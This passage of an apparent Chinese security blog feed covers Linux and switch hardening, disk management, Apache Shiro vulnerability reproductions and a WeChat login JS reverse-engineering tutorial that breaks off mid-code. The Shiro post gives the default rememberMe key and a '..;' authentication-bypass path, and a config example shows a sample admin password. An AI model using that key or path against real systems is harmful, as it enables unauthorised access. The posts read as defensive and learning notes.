required     pam_nologin.so</span><br><span class="line">account    include      password-auth</span><br><span class="line">password   include      password-auth</span><br><span class="line"># pam_selinux.so close should be the first session rule</span><br><span class="line">session    required     pam_selinux.so close</span><br><span class="line">session    required     pam_loginuid.so</span><br><span class="line"># pam_selinux.so open should only be followed by sessions to be executed in the user context</span><br><span class="line">session    required     pam_selinux.so open env_params</span><br><span class="line">session    optional     pam_keyinit.so force revoke</span><br><span class="line">session    include      password-auth</span><br></pre></td></tr></table></figure><p><strong>问题：</strong><code>Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open.</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改提示文件的权限，只列出了一个文件</span></span><br><span class="line">chmod 0600 /etc/ssh/ssh_host_rsa_key</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache shiro系列漏洞</title>
      <link href="/posts/18014/"/>
      <url>/posts/18014/</url>
      
        <content type="html"><![CDATA[<h3 id="Apache-shiro-1-2-4反序列化漏洞-CVE-2016-4437"><a href="#Apache-shiro-1-2-4反序列化漏洞-CVE-2016-4437" class="headerlink" title="Apache shiro 1.2.4反序列化漏洞(CVE-2016-4437)"></a>Apache shiro 1.2.4反序列化漏洞(CVE-2016-4437)</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p><code>Apache Shiro &lt;= 1.2.4</code></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><blockquote><p>在 1.2.4 版本前，默认ASE秘钥Key: <code>kPH+bIxk5D2deZiIxcaaaA==</code></p><p>工具：<code>https://github.com/SummerSec/ShiroAttack2</code></p></blockquote><p>登录时查看返回包是否含有<code>rememberMe</code>字段，如果没有则将请求包的cookie字段设置为<code>Cookie: rememberme=1</code>。</p><p><img src="https://image.jh2ing.com/image-20230312163236271.png" alt="image-20230312163236271"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>升级版本</li><li>修改密钥</li></ul><h3 id="Apache-Shiro-认证绕过漏洞（CVE-2020-1957）"><a href="#Apache-Shiro-认证绕过漏洞（CVE-2020-1957）" class="headerlink" title="Apache Shiro 认证绕过漏洞（CVE-2020-1957）"></a>Apache Shiro 认证绕过漏洞（CVE-2020-1957）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p><code>Apache Shiro &lt; 1.5.2 </code></p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接请求管理页面<code>/admin/</code>，会被重定向到登录页面。</p><p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p><p><img src="https://image.jh2ing.com/image-20230312210005083.png" alt="image-20230312210005083"></p><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>升级版本</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux磁盘管理</title>
      <link href="/posts/37426/"/>
      <url>/posts/37426/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux磁盘分区"><a href="#Linux磁盘分区" class="headerlink" title="Linux磁盘分区"></a>Linux磁盘分区</h3><blockquote><p>如果磁盘容量小于2TB，系统默认使用MBR分区表来安装。</p><p>这里强行使用GPT分区表分区；<code>install centos7</code>选项按<code>tab</code>键，在末尾输入<code>inst.gpt</code>关键字。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 40GB分区情况（根据实际情况划为其它如：/data、/var等）</span><br><span class="line">BIOS boot2MB</span><br><span class="line">/boot1GB</span><br><span class="line">/10GB</span><br><span class="line">/home5GB</span><br><span class="line">swap1GB</span><br></pre></td></tr></table></figure><h3 id="Linux磁盘管理"><a href="#Linux磁盘管理" class="headerlink" title="Linux磁盘管理"></a>Linux磁盘管理</h3><ul><li><code>lsblk</code>列出系统上的所有磁盘列表</li><li><code>blkid</code>列出设备参数</li><li><code>parted device_name print</code>列出磁盘类型和分区信息</li></ul><p><strong>磁盘分区</strong></p><blockquote><p>MBR分区表使用<code>fdisk</code>分区，GPT分区表使用<code>gdisk</code>分区</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdisk device_name</span><br></pre></td></tr></table></figure><ul><li>delete a partition 删除一个分区</li><li>add a new partition 增加一个分区</li><li>print the partition table 打印分区表</li><li>quit without saving changes 不保存分区离开</li><li>write table to disk and exit 保存分区操作后离开</li></ul><blockquote><p>不要在MBR分区表使用<code>gdisk</code>，也不要在GPT分区表使用<code>fdisk</code>；如果按错会失去整个分区记录。</p><p>新建分区时注意<code>Last sector</code>参数输出，默认把所有空闲空间分配出去。一般参数都是<code>+xG</code>，也就是加减多少G或者M。</p></blockquote><p>新建完成之后保存，<code>cat /proc/partitions</code>发现分区表没有更新；通过<code>partprobe -s</code>更新分区表。</p><p><strong>硬盘格式化</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfs.xfs device_name</span><br><span class="line">mkfs.ext4 device_name</span><br></pre></td></tr></table></figure><p><strong>文件系统挂载</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount uuid/device_name 挂载点</span><br><span class="line">umount 挂载点</span><br></pre></td></tr></table></figure><p>启动挂载<code>vi /etc/fstab</code>，编辑完成之后保存测试<code>mount -a</code>并查看是否挂载成功。</p><blockquote><p>如果被挂载了先<code>umount</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid=&quot;&quot;挂载点(例如：/data/test)文件系统(例如：xfs)defaults00</span><br></pre></td></tr></table></figure><h3 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h3><p><strong>1、PV阶段</strong></p><ul><li><code>pvcreate</code>将物理分区建立为PV。</li><li><code>pvscan</code>查找目前系统中任何具有PV的磁盘。</li><li><code>pvdisplay</code>显示目前系统上的PV状态。</li><li><code>pvremove</code>将PV属性删除。</li></ul><p><strong>2、VG阶段</strong></p><ul><li><code>vgcreate</code>建立为VG。</li><li><code>vgscan</code>查找系统上是否有vg存在。</li><li><code>vgdisplay</code>显示目前系统上的VG状态。</li><li><code>vgextend</code>在VG内增加额外的PV。</li><li><code>vgreduce</code>在VG内删除PV。</li><li><code>vgchange</code>设置VG是否启动。</li><li><code>vgremove</code>删除一个VG。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vgcreate vg_name pv_name</span><br><span class="line">-s参数：指定PE大小</span><br><span class="line"></span><br><span class="line">例子：vgcreate -s 16M test_vg /dev/sda&#123;6,7&#125;</span><br></pre></td></tr></table></figure><p><strong>3、LV阶段</strong></p><ul><li><code>lvcreate</code>建立为LV。</li><li><code>lvscan</code>查询系统上的LV。</li><li><code>lvdisplay</code>显示目前系统上的LV状态。</li><li><code>lvextend</code>LV增加容量。</li><li><code>lvreduce</code>LV减少容量。</li><li><code>lvresize</code>对LV的容量大小进行调整。</li><li><code>lvremove</code>删除一个LV。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lvcreate -L size -n lv_name vg_name</span><br><span class="line">-L 最小单位是PE（容量单位：M、G、T）</span><br><span class="line">-l PE个数划为，前面vg一个PE 16MB</span><br></pre></td></tr></table></figure><blockquote><p>LV创建成功之后，后面的所有操作必须使用全名，即&#x2F;dev&#x2F;vg_name&#x2F;lv_name。</p></blockquote><p>后面进行格式化和挂载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">针对LV扩容</span><br><span class="line">1、确定扩容大小，查看VG剩余容量是否满足</span><br><span class="line">2、如果满足，则直接使用lvextend，不满足则先对VG增加PV来增加容量。</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">lvresize -L +300M /dev/test_vg/test_lv</span><br><span class="line"># 需要更新一下</span><br><span class="line">xfs_growfs /dev/test_vg/test_lv</span><br></pre></td></tr></table></figure><blockquote><p>针对不同格式的更新：</p><p><code>resize2fs </code>针对文件系统ext2 ext3 ext4<br><code>xfs_growfs</code> 针对文件系统xfs</p></blockquote><p><strong>使用常见举例：</strong></p><blockquote><p><code>https://blog.csdn.net/yy4545/article/details/125873011</code></p></blockquote><h3 id="关于软件磁盘阵列"><a href="#关于软件磁盘阵列" class="headerlink" title="关于软件磁盘阵列"></a>关于软件磁盘阵列</h3><blockquote><p><code>mdadm</code> [模式] [RAID 设备文件名] [选项]</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">模式： - Assemble：加入一个已经存在的阵列；</span><br><span class="line">- Build：创建一个没有超级块的阵列；</span><br><span class="line">- Create：创建一个阵列，每个设备都具有超级块；</span><br><span class="line">- Manage：管理阵列，如添加设备和删除损坏设备；</span><br><span class="line">- Misc：允许单独对阵列中的设备进行操作，如停止阵列；</span><br><span class="line">- Follow or Monitor：监控 RAID 状态； Grow：改变 RAID 的容量或阵列中的数目；</span><br><span class="line"></span><br><span class="line">选项： -s,-scan：扫描配置文件或/proc/mdstat 文件，发现丟失的信息；</span><br><span class="line">-D,-detail：查看磁盘阵列详细信息；</span><br><span class="line">-C,-create：建立新的磁盘阵列，也就是调用 Create 模式；</span><br><span class="line">-a,-auto=yes：采用标准格式建立磁阵列；</span><br><span class="line">-n,-raicklevices=数字：使用几块硬盘或分区组成 RAID；</span><br><span class="line">-l,-level=级别：创建 RAID 的级别，可以是 0,1,5；</span><br><span class="line">-x,-spare-devices=数字：使用几块硬盘或分区组成备份设备；</span><br><span class="line">-a,-add 设备文件名：在已经存在的 RAID 中加入设备；</span><br><span class="line">-r,-remove 设备文件名名：在已经存在的 RAID 中移除设备；</span><br><span class="line">-f,-fail 设备文件名：把某个组成 RAID 的设备设置为错误状态；</span><br><span class="line">-S,-stop：停止 RAID 设备；</span><br><span class="line">-A,-assemble：按照配置文件加载 RAID</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机常见场景配置</title>
      <link href="/posts/34203/"/>
      <url>/posts/34203/</url>
      
        <content type="html"><![CDATA[<h3 id="场景一：端口镜像"><a href="#场景一：端口镜像" class="headerlink" title="场景一：端口镜像"></a>场景一：端口镜像</h3><blockquote><p>网络维护过程中会遇到需要对报文进行获取和分析的情况，比如怀疑有攻击报文，此时需要在不影响报文转发的情况下，对报文进行获取和分析。</p><p>镜像可以在不影响报文正常处理流程的情况下，将镜像端口的报文复制一份到观察端口，用户利用数据监控设备来分析复制到观察端口的报文，进行网络监控和故障排除。</p></blockquote><p><em>Huawei S5700：配置项</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 配置观察口</span><br><span class="line">[Huawei]observe-port [ observe-port-index ] interface interface-type interface-number</span><br><span class="line"># 配置观察端口组</span><br><span class="line">[Huawei]observe-port group group-id</span><br><span class="line">[Huawei]group-member &#123; interface-type interface-number [ to interface-type interface-number ] &#125; &amp;&lt;1-8&gt;</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line"># 配置本地端口镜像</span><br><span class="line">[Huawei]interface interface-type interface-number</span><br><span class="line"># 配置将端口流量镜像到观察端口或者观察端口组</span><br><span class="line">[Huawei]port-mirroring observe-port &#123; observe-port-index | group group-id &#125; &#123; both | inbound | outbound &#125;</span><br><span class="line"></span><br><span class="line"># 配置本地VLAN镜像</span><br><span class="line">[Huawei]vlan vlan-id</span><br><span class="line">[Huawei]mirroring observe-port &#123; observe-port-index | group group-id &#125; &#123; inbound | outbound | both &#125;</span><br></pre></td></tr></table></figure><blockquote><p>both | inbound | outbound分别表示镜像设备双向（接收和发送两个方向）&#x2F;入方向（接收方向）&#x2F;出方向（发送方向）的报文。</p></blockquote><p><em>H3C S5120：配置项</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建本地镜像组</span><br><span class="line">mirroring-group 1 local</span><br><span class="line">为本地镜像组配置源端口和目的端口</span><br><span class="line">mirroring-group 1 mirroring-port gigabitethernet 1/0/1 gigabitethernet 1/0/2 both</span><br><span class="line">mirroring-group 1 monitor-port gigabitethernet 1/0/3</span><br></pre></td></tr></table></figure><h3 id="场景二：以太网链路聚合"><a href="#场景二：以太网链路聚合" class="headerlink" title="场景二：以太网链路聚合"></a>场景二：以太网链路聚合</h3><blockquote><p>随着网络规模不断扩大，用户对骨干链路的带宽和可靠性提出越来越高的要求。在传统技术中，常用更换高速率的单板或更换支持高速率单板的设备的方式来增加带宽，但这种方案需要付出高额的费用，而且不够灵活。</p><p>Eth-Trunk采用链路聚合技术，可以在不进行硬件升级的条件下，通过将多个物理接口捆绑为一个逻辑接口，达到增加链路带宽的目的。在实现增大带宽目的的同时，Eth-Trunk采用备份链路的机制，可以有效的提高设备之间链路的可靠性。</p></blockquote><ul><li><p>增加带宽</p><p>链路聚合接口的最大带宽可以达到各成员接口带宽之和。</p></li><li><p>提高可靠性</p><p>当某条活动链路出现故障时，流量可以切换到其他可用的成员链路上，从而提高链路聚合接口的可靠性。</p></li><li><p>负载分担</p><p>在一个链路聚合组内，可以实现在各成员活动链路上的负载分担。</p></li></ul><p><em>Huawei S5700：配置项</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 创建Eth-Trunk接口并进入Eth-Trunk接口视图</span><br><span class="line">[Huawei]interface Eth-Trunk trunk-id</span><br><span class="line"># 配置链路聚合模式</span><br><span class="line">[Huawei]mode &#123; manual load-balance | lacp-static | lacp-dynamic &#125;</span><br><span class="line"></span><br><span class="line"># 添加接口</span><br><span class="line">[Huawei]trunkport interface-type interface-number</span><br></pre></td></tr></table></figure><blockquote><p>缺省情况下，链路聚合模式为<strong>manual load-balance</strong>。</p><p><strong>manual load-balance</strong>表示手工模式Eth-Trunk，该模式下所有链路都参与负载分担；<strong>lacp-static</strong>表示静态LACP模式Eth-Trunk，<strong>lacp-dynamic</strong>表示动态LACP模式Eth-Trunk。</p></blockquote><p><em>H3C S5120：配置项</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建二层聚合接口1</span><br><span class="line">interface bridge-aggregation 1</span><br><span class="line"># 将端口GigabitEthernet1/0/1加入到聚合组1中</span><br><span class="line">interface gigabitethernet 1/0/1</span><br><span class="line">port link-aggregation group 1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为交换机加固</title>
      <link href="/posts/62317/"/>
      <url>/posts/62317/</url>
      
        <content type="html"><![CDATA[<h3 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h3><blockquote><p>开启密码复杂度；定期修改密码；开启登录失败处理策略和登录会话超时时间</p></blockquote><p>有些老旧的交换机无法进行配置，一般来说新设备都自己开启了密码策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 开启密码策略</span><br><span class="line">password-control enable</span><br><span class="line">// 开启密码有效期的策略</span><br><span class="line">password-control aging enable</span><br><span class="line">// 配置密码有效的时间为90天</span><br><span class="line">password-control aging 90</span><br><span class="line">// 开启密码长度的限制</span><br><span class="line">password-control length enable</span><br><span class="line">// 配置密码长度最小为16位</span><br><span class="line">password-control length 16</span><br><span class="line">// 配置密码可尝试的失败次数为10</span><br><span class="line">password-control login-attempt 10 exceed lock-time 10</span><br></pre></td></tr></table></figure><p>设置登录会话超时时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Huawei-aaa]local-user admin idle-timeout ?</span><br><span class="line">  INTEGER&lt;0-35791&gt;  Set the number of minutes before terminal user(s) time out</span><br><span class="line">  </span><br><span class="line">[Huawei]user-interface current</span><br><span class="line">[Huawei-ui-console0]idle-timeout ?</span><br><span class="line">  INTEGER&lt;0-35791&gt;  Set the number of minutes before a terminal user times</span><br><span class="line">                    out(default: 10minutes)</span><br></pre></td></tr></table></figure><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><blockquote><p>配置登录用户权限（三权分立）；清除多余的账户；禁用不必要的服务；关闭不必要的端口</p></blockquote><p>只允许console登录或者是较为安全的ssh远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># aaa认证</span><br><span class="line">aaa</span><br><span class="line"># 配置本地用户并设置权限</span><br><span class="line">local-user sysadmin privilege level 15 password cipher Huawei@123</span><br><span class="line"># 配置用户接入类型（注意：默认不设置，terminal为本终端，如果不配置用户无法进入终端）</span><br><span class="line">local-user sysadmin service-type ssh terminal</span><br><span class="line"></span><br><span class="line"># 进入console</span><br><span class="line">user-interface console 0</span><br><span class="line"># 配置认证模式aaa</span><br><span class="line">authentication-mode aaa</span><br><span class="line"></span><br><span class="line"># 配置ssh</span><br><span class="line"></span><br><span class="line"># 开启ssh服务</span><br><span class="line">stelnet server enable</span><br><span class="line"></span><br><span class="line"># 添加ssh用户</span><br><span class="line">ssh user sysadmin authentication-type password</span><br><span class="line"></span><br><span class="line"># 创建公钥</span><br><span class="line">rsa local-key-pair create</span><br><span class="line">dsa local-key-pair create</span><br><span class="line"># 进入用户接口</span><br><span class="line">user-interface vty 0 4</span><br><span class="line"># 配置认证模式aaa</span><br><span class="line">authentication-mode aaa</span><br><span class="line"># 配置登录协议</span><br><span class="line">protocol inbound ssh</span><br></pre></td></tr></table></figure><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><blockquote><p>开启日志审计（满足180天）；本地备份日志信息；定期备份并做恢复测试</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 开启信息管理</span><br><span class="line">info-center enable</span><br><span class="line"># 日志服务器</span><br><span class="line">[Huawei]info-center ?</span><br><span class="line">  channel             Set the name of information channel</span><br><span class="line">  console             Setting of console configuration </span><br><span class="line">  enable              Enable the information center</span><br><span class="line">  filter-id           Specify the configuration of the ID filtering table</span><br><span class="line">  local               Setting of logging configuraitons except loghost</span><br><span class="line">  logbuffer           Setting of log buffer configuration </span><br><span class="line">  loghost             Setting of logging host configuration</span><br><span class="line">  monitor             Setting of monitor configuration </span><br><span class="line">  rate-limit          Specify the rate at which the information center</span><br><span class="line">                      processes information</span><br><span class="line">  snmp                Setting of snmp configuration </span><br><span class="line">  source              Informational source setting</span><br><span class="line">  statistic-suppress  Suppression that the first occurrence of an event is</span><br><span class="line">                      always logged immediately, but subsequence identical</span><br><span class="line">                      messages are suppressed</span><br><span class="line">  timestamp           Set the time stamp type of information</span><br><span class="line">  trapbuffer          Setting of trap buffer configuration</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信公众号平台js逆向</title>
      <link href="/posts/20669/"/>
      <url>/posts/20669/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>JS逆向学习，根据教程进行案例实战并记录过程，本次案例为微信公众号登录密码字段加密逆向。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>在登录界面输入账号和密码点击登录获取到数据请求包，这里实验随便输入账号密码。</p><p>按f12使用开发者工具，在网络选项中查看请求，查看我们请求所提交的表单数据，发现<code>pwd</code>也就是我们的密码字段已经做了加密。</p><p><img src="http://image.jh2ing.com/image-20221223141635030.png" alt="image-20221223141635030"></p><p>加密字段是<code>pwd</code>，这时直接<code>srtl+shift+f</code>全局搜索关键字<code>pwd</code>。</p><p>这时搜索到很多含有<code>pwd</code>关键字的文件，一般加密都是通过js文件来进行加密，直接查看js文件中的<code>pwd</code>关键字</p><p><img src="http://image.jh2ing.com/image-20221223142356297.png" alt="image-20221223142356297"></p><p>直接点击js文件，这时的js文件是压缩的，直接点击<code>&#123;&#125;</code>进行格式化</p><p><img src="http://image.jh2ing.com/image-20221223142709223.png" alt="image-20221223142709223"></p><p>然后在查看js文件中的20条匹配结果，对有<code>pwd</code>关键字的地方或者是看起来像加密的地方下断点。</p><p><img src="http://image.jh2ing.com/image-20221223143028979.png" alt="image-20221223143028979"></p><p>打上断点之后重新点击登录按钮进入调试状态，运行到第一个断点，发现<code>pwd</code>值为123。</p><p><img src="http://image.jh2ing.com/image-20221223143405129.png" alt="image-20221223143405129"></p><p>选中全部会发现这个字符串就是加密后的值，说明此处对<code>pwd</code>进行了加密处理</p><p><img src="http://image.jh2ing.com/image-20221223143647010.png" alt="image-20221223143647010"></p><p>进入下一步函数调用</p><p><img src="http://image.jh2ing.com/image-20221223144032998.png" alt="image-20221223144032998"></p><p>进入到return这里，发现调用了很多函数，然后返回了加密值</p><p><img src="http://image.jh2ing.com/image-20221223144318614.png" alt="image-20221223144318614"></p><p>找到这里所有的js代码，对这最后这个<code>&#125;</code>往上的所有函数，也就是靠着左边红线的所有函数</p><p><img src="http://image.jh2ing.com/image-20221223145435328.png" alt="image-20221223145435328"></p><p><img src="http://image.jh2ing.com/image-20221223145626066.png" alt="image-20221223145626066"></p><p>把这部分复制进js调试工具，第一步首先格式化代码，然后加载代码发现<code>n 未定义</code>，这里重新定义一下<code>n</code></p><p><img src="http://image.jh2ing.com/image-20221223145816830.png" alt="image-20221223145816830"></p><p>在首行定义n为一个空对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = &#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20221223145951410.png" alt="image-20221223145951410"></p><p>然后再次加载代码成功</p><p><img src="http://image.jh2ing.com/image-20221223150242096.png" alt="image-20221223150242096"></p><p>重写一下匿名函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> t ? n ? <span class="title function_">i</span>(t, e) : <span class="title function_">o</span>(<span class="title function_">i</span>(t, e)) : n ? <span class="title function_">r</span>(e) : <span class="title function_">o</span>(<span class="title function_">r</span>(e))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改写后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPasswd</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> t ? n ? <span class="title function_">i</span>(t, e) : <span class="title function_">o</span>(<span class="title function_">i</span>(t, e)) : n ? <span class="title function_">r</span>(e) : <span class="title function_">o</span>(<span class="title function_">r</span>(e))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用函数计算结果，对比之前的值一样。</p><p><img src="http://image.jh2ing.com/image-20221223150732911.png" alt="image-20221223150732911"></p><h3 id="使用nodejs-python执行"><a href="#使用nodejs-python执行" class="headerlink" title="使用nodejs+python执行"></a>使用nodejs+python执行</h3><p>安装PyExecJs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyExecJs</span><br></pre></td></tr></table></figure><p>在Pycharm中安装nodejs插件，然后配置nodejs</p><p><img src="http://image.jh2ing.com/image-20221223151121259.png" alt="image-20221223151121259"></p><p>编写python文件执行js</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line">node = execjs.get()</span><br><span class="line"></span><br><span class="line"><span class="comment"># # js源文件编译</span></span><br><span class="line">ctx = node.<span class="built_in">compile</span>(<span class="built_in">open</span>(<span class="string">&#x27;test.js&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 执行js函数</span></span><br><span class="line">funcName = <span 